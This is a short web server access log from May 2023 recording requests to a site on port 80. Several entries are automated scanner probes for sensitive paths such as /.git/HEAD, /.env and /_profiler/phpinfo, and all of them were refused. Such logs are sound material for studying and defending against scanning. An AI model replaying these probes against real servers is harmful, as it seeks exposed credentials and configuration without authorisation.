localhost:80 3.122.224.54 - - [02/May/2023:02:27:04 +0000] "GET /.git/HEAD HTTP/1.1" 404 245 "-" "Python-urllib/3.9"
localhost:80 192.241.209.118 - - [02/May/2023:02:48:46 +0000] "MGLNDD_54.155.101.2_80\n" 400 483 "-" "-"
localhost:80 34.77.127.183 - - [02/May/2023:03:07:04 +0000] "GET / HTTP/1.1" 200 6342 "-" "python-requests/2.28.2"
localhost:80 37.143.201.212 - - [02/May/2023:03:07:34 +0000] "GET / HTTP/1.1" 200 22418 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
localhost:80 135.125.246.189 - - [02/May/2023:03:14:15 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.189 - - [02/May/2023:03:14:15 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 179.43.177.243 - - [02/May/2023:03:36:43 +0000] "GET / HTTP/1.1" 200 22418 "-" "Hello World"
localhost:80 43.154.128.189 - - [02/May/2023:03:38:12 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 43.153.201.149 - - [02/May/2023:03:39:14 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 167.71.159.74 - - [02/May/2023:03:51:24 +0000] "GET / HTTP/1.0" 200 22396 "-" "-"
localhost:80 193.32.162.159 - - [02/May/2023:04:00:44 +0000] "GET / HTTP/1.1" 200 525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 165.227.0.21 - - [02/May/2023:04:31:10 +0000] "GET / HTTP/1.0" 200 22396 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
